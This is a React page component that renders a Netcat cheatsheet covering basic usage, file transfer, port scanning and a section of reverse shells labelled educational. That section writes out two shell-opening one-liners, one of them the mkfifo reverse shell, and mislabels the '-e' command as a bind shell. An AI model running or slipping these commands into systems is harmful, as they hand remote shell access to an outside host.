import CommandCard from "@/components/CommandCard";
import { Shield, Server, Radio, FileText } from "lucide-react";

const commands = [
    {
        category: "Basics",
        icon: <Radio className="h-5 w-5" />,
        items: [
            { command: "nc -h", description: "Print help and available options." },
            { command: "nc -v [host] [port]", description: "Verbose mode. Shows connection status." },
            { command: "nc -l -p [port]", description: "Listen mode. Opens a port for incoming connections." },
        ]
    },
    {
        category: "File Transfer",
        icon: <FileText className="h-5 w-5" />,
        items: [
            { command: "nc -l -p 1234 > outfile", description: "Receive a file on port 1234." },
            { command: "nc [host] 1234 < infile", description: "Send a file to the listener." },
        ]
    },
    {
        category: "Port Scanning",
        icon: <Server className="h-5 w-5" />,
        items: [
            { command: "nc -z -v [host] 1-1000", description: "Scan ports 1 to 1000 on the target host." },
            { command: "nc -z -v -u [host] 1-1000", description: "UDP port scan." },
        ]
    },
    {
        category: "Reverse Shells (Educational)",
        icon: <Shield className="h-5 w-5" />,
        items: [
            { command: "nc -e /bin/bash [host] [port]", description: "Bind shell (Linux). Execute bash on connection." },
            { command: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [host] [port] >/tmp/f", description: "Reverse shell using mkfifo (when -e is disabled)." },
        ]
    }
];

export default function CheatsheetPage() {
    return (
        <div className="container py-12 md:py-24">
            <div className="flex flex-col items-center text-center mb-12">
                <h1 className="text-3xl font-bold tracking-tighter sm:text-4xl md:text-5xl text-primary mb-4">
                    Netcat Cheatsheet
                </h1>
                <p className="max-w-[700px] text-muted-foreground md:text-xl">
                    The essential commands for debugging, scanning, and data transfer.
                </p>
            </div>

            <div className="grid gap-8 md:grid-cols-2">
                {commands.map((section, idx) => (
                    <div key={idx} className="space-y-4">
                        <div className="flex items-center gap-2 text-xl font-semibold text-foreground border-b border-border pb-2">
                            {section.icon}
                            <h2>{section.category}</h2>
                        </div>
                        <div className="grid gap-4">
                            {section.items.map((item, i) => (
                                <CommandCard
                                    key={i}
                                    command={item.command}
                                    description={item.description}
                                />
                            ))}
                        </div>
                    </div>
                ))}
            </div>
        </div>
    );
}
